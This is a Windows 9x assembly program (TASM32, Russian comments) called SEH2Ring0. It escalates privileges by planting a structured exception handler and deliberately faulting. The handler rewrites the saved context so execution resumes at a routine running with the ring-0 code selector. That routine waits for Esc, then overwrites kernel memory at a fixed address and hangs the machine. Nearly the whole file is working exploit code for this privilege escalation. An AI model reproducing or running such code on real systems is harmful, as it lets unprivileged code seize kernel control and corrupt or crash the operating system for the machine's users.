; tasm32 /m3 /ml seh2r0,,;
; tlink32 /Tpe /aa seh2r0,seh2r0,,import32.lib
        .386p
        .model  flat
        extrn   MessageBoxA:PROC
        extrn   Sleep:PROC
        extrn   ExitProcess:PROC
        extrn   CreateThread:PROC
        extrn   GetLastError:PROC

        .data
 szTitle        db      " SEH2Ring0 ",0

  start:
        push offset errorhandler1
        push    dword ptr fs:[0]                
        mov     fs:[0],esp                      
        mov ebx,offset Ring0Proc
        xor eax,eax
        mov eax,[eax]
        errorhandler1:
        mov esi,[esp+0ch]    ; eax=Lp2CONTEXT
        mov eax,[esi+0a4h]   ; eax=OldEBX
        mov [esi+0b8h],eax   ; NewEIP=OldEBX
        mov eax,28h
        mov [esi+0bch],eax   ; NewCS=28h
        xor eax,eax
        ret
;------------------     Ring 0  ----------------------------------
Ring0Proc:
        push ss
        pop ds
        push ss
        pop es
        WaitESC:                          ; Ждем нажатия Esc
        in al,60h                         ;
        cmp al,1                          ;
        jne WaitESC                       ;
        not     dword ptr ds:[0BFF70000h] ; пишем в кернел
        inc dword ptr [Flag]              ;
        jmp $                             ;
;-----------------------------------------------------------------
       Flag dd 0
       ddd dd ?
        .code
starts:
;------------------     Ring 3   ----------------------------------
                        push    offset offset ddd  ; Запускаем  "нитку"
                        push    0                  ;
                        push    0                  ;
                        push    offset  start      ;
                        push    0                  ;
                        push    0                  ;
                        call   CreateThread        ;
                        Waits:                     
                        mov eax,[Flag]             ; Ждем ее завершения
                        or eax,eax
                        jz Waits
                        push    00000000h
                        push    offset szTitle
                        push    offset szTitle
                        push    00000000h
                        call    MessageBoxA
                        push    00000000h
                        call    ExitProcess       ;И так понятно... :)
                        end    starts

;Источники доп. информации:
;http://members.xoom.com/Iczel/Exceptionhandling.html
;http://members.xoom.com/Iczel/files/SEHinASM.zip